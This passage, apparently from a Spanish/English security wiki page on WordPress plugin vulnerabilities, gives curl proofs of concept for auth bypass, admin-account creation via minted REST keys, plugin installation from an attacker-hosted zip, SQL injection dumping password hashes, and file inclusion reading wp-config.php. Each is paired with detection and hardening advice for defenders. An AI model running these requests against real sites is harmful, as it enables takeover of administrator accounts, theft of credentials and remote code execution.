action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Indicadores de éxito esperados

- HTTP 200 con cuerpo JSON como {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* para el usuario víctima; las solicitudes posteriores estarán autenticadas.

Encontrar el nombre de la acción

- Inspecciona el tema/plugin en busca de registros add_action('wp_ajax_nopriv_...', '...') en el código de social login (p. ej., framework/add-ons/social-login/class-social-login.php).
- Haz grep de wp_set_auth_cookie(), get_user_by('email', ...) dentro de los manejadores AJAX.

Lista de comprobación de detección

- Registros web mostrando POSTs no autenticados a /wp-admin/admin-ajax.php con la acción social-login e id=<email>.
- Respuestas 200 con el JSON de éxito inmediatamente antes de tráfico autenticado desde la misma IP/User-Agent.

Endurecimiento

- No derives la identidad de la entrada del cliente. Acepta solo emails/IDs que se originen de un token/ID del proveedor validado.
- Exige CSRF nonces y comprobaciones de capacidades incluso para helpers de login; evita registrar wp_ajax_nopriv_ salvo que sea estrictamente necesario.
- Valida y verifica las respuestas OAuth/OIDC en el servidor; rechaza proveedores faltantes/inválidos (sin fallback al POST id).
- Considera deshabilitar temporalmente social login o aplicar un parche virtual en el edge (bloquear la acción vulnerable) hasta que se arregle.

Comportamiento parcheado (Jobmonster 4.8.0)

- Se eliminó el fallback inseguro de $_POST['id']; $user_email debe originarse de ramas del proveedor verificadas en switch($_POST['using']).

## Escalada de privilegios no autenticada vía REST token/key minting en identidad predecible (OttoKit/SureTriggers ≤ 1.0.82)

Algunos plugins exponen endpoints REST que generan “claves de conexión” reutilizables o tokens sin verificar las capacidades del llamante. Si la ruta autentica solo por un atributo adivinable (p. ej., nombre de usuario) y no vincula la clave a un usuario/sesión con comprobaciones de capacidad, cualquier atacante no autenticado puede generar una clave e invocar acciones privilegiadas (creación de cuenta de administrador, acciones de plugins → RCE).

- Ruta vulnerable (ejemplo): sure-triggers/v1/connection/create-wp-connection
- Fallo: acepta un nombre de usuario, emite una connection key sin current_user_can() ni un permission_callback estricto
- Impacto: toma de control completa al encadenar la clave generada a acciones internas privilegiadas

PoC – Generar una clave de conexión y usarla
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Por qué es explotable
- Sensitive REST route protected only by low-entropy identity proof (username) or missing permission_callback
- No capability enforcement; minted key is accepted as a universal bypass

Detection checklist
- Grep plugin code for register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Any route that issues tokens/keys based on request-supplied identity (username/email) without tying to an authenticated user or capability
- Look for subsequent routes that accept the minted token/key without server-side capability checks

Hardening
- For any privileged REST route: require permission_callback that enforces current_user_can() for the required capability
- Do not mint long-lived keys from client-supplied identity; if needed, issue short-lived, user-bound tokens post-authentication and recheck capabilities on use
- Validate the caller’s user context (wp_set_current_user is not sufficient alone) and reject requests where !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse → unauthenticated arbitrary plugin installation (FunnelKit Automations ≤ 3.5.3)

Nonces prevent CSRF, not authorization. If code treats a nonce pass as a green light and then skips capability checks for privileged operations (e.g., install/activate plugins), unauthenticated attackers can meet a weak nonce requirement and reach RCE by installing a backdoored or vulnerable plugin.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce “passes”
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## Unauthenticated SQLi via s search parameter in depicter-* actions (Depicter Slider ≤ 3.6.1)

Multiple depicter-* actions consumed the s (search) parameter and concatenated it into SQL queries without parameterization.

- Parameter: s (search)
- Flaw: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Lista de verificación de detección
- Grep for depicter-* action handlers and direct use of $_GET['s'] or $_POST['s'] in SQL
- Revisar consultas personalizadas pasadas a $wpdb->get_results()/query() concatenando s

Mitigación
- Usar siempre $wpdb->prepare() o wpdb placeholders; rechazar metacaracteres inesperados en el servidor
- Agregar una lista de permitidos (allowlist) estricta para s y normalizar al charset/longitud esperados

---

## Unauthenticated Local File Inclusion a través de una ruta de template/archivo no validada (Kubio AI Page Builder ≤ 2.5.1)

Aceptar rutas controladas por el atacante en un parámetro de template sin normalización/contención permite leer archivos locales arbitrarios, y a veces ejecución de código si archivos PHP/log incluibles son cargados en tiempo de ejecución.

- Parámetro: __kubio-site-edit-iframe-classic-template
- Falla: sin normalización/allowlisting; traversal permitido
- Impacto: divulgación de secretos (wp-config.php), RCE potencial en entornos específicos (log poisoning, includable PHP)

PoC – leer wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Detection checklist
- Any handler concatenating request paths into include()/require()/read sinks without realpath() containment
- Look for traversal patterns (../) reaching outside the intended templates directory

Hardening
- Forzar plantillas en lista permitida; resolver con realpath() y requerir str_starts_with(realpath(file), realpath(allowed_base))
- Normalizar la entrada; rechazar secuencias de traversal y rutas absolutas; usar sanitize_file_name() solo para nombres de archivo (no rutas completas)


## Referencias

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
